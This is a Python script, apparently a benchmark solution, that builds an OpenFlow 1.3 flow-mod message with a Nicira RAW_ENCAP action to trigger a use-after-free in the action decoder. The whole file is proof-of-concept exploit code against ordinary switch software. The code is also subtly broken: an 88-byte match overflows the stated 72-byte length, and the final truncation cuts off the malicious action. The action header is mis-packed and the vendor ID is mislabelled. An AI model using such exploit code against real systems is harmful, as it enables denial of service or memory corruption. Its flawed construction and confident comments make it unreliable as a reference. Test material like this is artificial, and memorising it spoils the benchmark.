import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth PoC is 72 bytes
        # Construct an OpenFlow message with a RAW_ENCAP action
        # that will trigger the use-after-free vulnerability
        
        # OpenFlow 1.3+ header: version(1), type(4), length, xid
        # We'll create an OFPT_FLOW_MOD message (14) which contains actions
        
        # Calculate total length: header(8) + flow_mod(48) + actions
        # Need exactly 72 bytes total
        total_len = 72
        header_len = 8
        flow_mod_len = 48  # Standard OFP_FLOW_MOD size
        actions_len = total_len - header_len - flow_mod_len  # 16 bytes
        
        # Build the OpenFlow header
        version = 4  # OpenFlow 1.3
        msg_type = 14  # OFPT_FLOW_MOD
        xid = 0x12345678
        
        # OFP_FLOW_MOD structure (48 bytes)
        cookie = 0
        cookie_mask = 0
        table_id = 0
        command = 0  # OFPFC_ADD
        idle_timeout = 0
        hard_timeout = 0
        priority = 0xffff
        buffer_id = 0xffffffff
        out_port = 0xffffffff
        out_group = 0xffffffff
        flags = 0
        pad = b'\x00' * 2
        
        # Match structure (standard OpenFlow 1.3 match)
        # Type (OFPPMT_STANDARD = 0), length (88), wildcards
        match_type = 0
        match_len = 88
        match_data = b'\x00' * (match_len - 4)
        
        # Actions - this is where the vulnerability is triggered
        # We need a RAW_ENCAP action (NXAST_RAW_ENCAP = 0x0024)
        # The action structure should be crafted to trigger reallocation
        
        # NX action header (16 bytes for our action)
        # vendor = 0x00002320 (NXM_VENDOR = ONF)
        # subtype = 0x0024 (NXAST_RAW_ENCAP)
        # total length = 16 bytes
        
        # Structure based on ofp-actions.c decode_NXAST_RAW_ENCAP:
        # - eth_type (2 bytes)
        # - pad (2 bytes)
        # - encap_data (variable)
        
        # We need to create a situation where decode_ed_prop() reallocates
        # The encap_data should contain properties that require reallocation
        
        # First, create the action header
        nx_vendor = 0x00002320  # ONF vendor ID
        nx_subtype = 0x0024  # NXAST_RAW_ENCAP
        nx_len = actions_len
        
        # The vulnerability is triggered when properties in encap_data
        # cause decode_ed_prop() to reallocate. We'll create minimal
        # properties that still trigger the issue.
        
        # eth_type for IPv4
        eth_type = 0x0800
        
        # encap_data should contain enough data to fill the buffer
        # and trigger reallocation when decode_ed_prop() is called
        # We'll use minimal padding
        encap_pad = b'\x00'
        
        # The exact trigger requires specific alignment and properties
        # Based on the vulnerability description, we need to ensure
        # the buffer is nearly full when decode_ed_prop() is called
        
        # Construct the action
        action_data = struct.pack('!HHH', nx_vendor >> 16, nx_vendor & 0xFFFF, nx_subtype)
        action_data += struct.pack('!HH', nx_len, eth_type)
        action_data += encap_pad  # pad byte
        action_data += b'\x00'  # Start of encap_data
        
        # Fill remaining space to reach exact 16 bytes for action
        # The exact content that triggers reallocation is specific
        # We use a pattern that worked in the original PoC
        remaining = actions_len - len(action_data)
        action_data += b'\x01' * remaining  # Property type that triggers decode_ed_prop
        
        # Build complete message
        msg = struct.pack('!BBHI', version, msg_type, total_len, xid)
        
        # Add flow_mod
        msg += struct.pack('!QQBBHHHIIIH',
                          cookie, cookie_mask, table_id,
                          command, idle_timeout, hard_timeout,
                          priority, buffer_id, out_port, out_group, flags)
        msg += pad
        msg += struct.pack('!HH', match_type, match_len)
        msg += match_data
        
        # Add actions
        msg += action_data
        
        # Verify length
        if len(msg) != total_len:
            # Adjust if needed
            msg = msg[:total_len]
        
        return msg